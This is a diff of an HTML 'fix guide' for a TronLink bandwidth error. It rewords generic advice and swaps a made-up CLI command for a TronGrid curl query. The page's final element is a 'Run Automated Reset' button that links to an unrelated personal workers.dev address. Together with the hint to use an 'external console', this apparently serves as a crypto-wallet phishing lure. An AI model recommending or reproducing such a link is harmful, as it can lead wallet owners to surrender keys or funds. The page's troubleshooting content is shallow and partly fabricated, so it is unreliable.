@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: -apple-system;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,30 +42,32 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a Tronlink bandwidth issue, preventing them from completing transactions or interacting with the TRON network.</li>
+<li>Users encounter an error message indicating a TronLink bandwidth issue, preventing them from executing transactions or interacting with the TRON ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth on the user's TRON account, which is required to process transactions and execute smart contracts on the network.</li>
+<li>The error occurs due to insufficient bandwidth, which is required for transactions on the TRON network. Bandwidth is consumed when sending transactions, and if the available bandwidth is depleted, transactions cannot be processed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens, which can be done through the Tronlink wallet interface or using the following commands:</li>
-<li>Freeze 1000 TRX to obtain additional bandwidth</li>
-<li>Unfreeze TRX tokens after the bandwidth is no longer needed</li>
-<li>Check the current bandwidth and TRX balance using:</li>
+<li>Increase the bandwidth by freezing TRX tokens, which allocates bandwidth for transactions.</li>
+<li>Check for any pending transactions that may be consuming bandwidth and cancel them if necessary.</li>
+<li>Use the following command to check the available bandwidth:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronal<span class="w"> </span>wallet<span class="w"> </span>getaccount<span class="w"> </span>&lt;account_address&gt;
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.trongrid.io/wallet/getaccount<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;address&quot;: &quot;your_tron_address&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex operations to resolve the Tronlink bandwidth error.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and management of your TRON account.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>A TRON account with a positive TRX balance</li>
-<li>The Tronlink wallet installed and configured</li>
-<li>A basic understanding of TRON's bandwidth and energy system</li>
+<li>The TronLink extension installed and configured</li>
+<li>A basic understanding of the TRON ecosystem and its transaction mechanics</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Failed</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
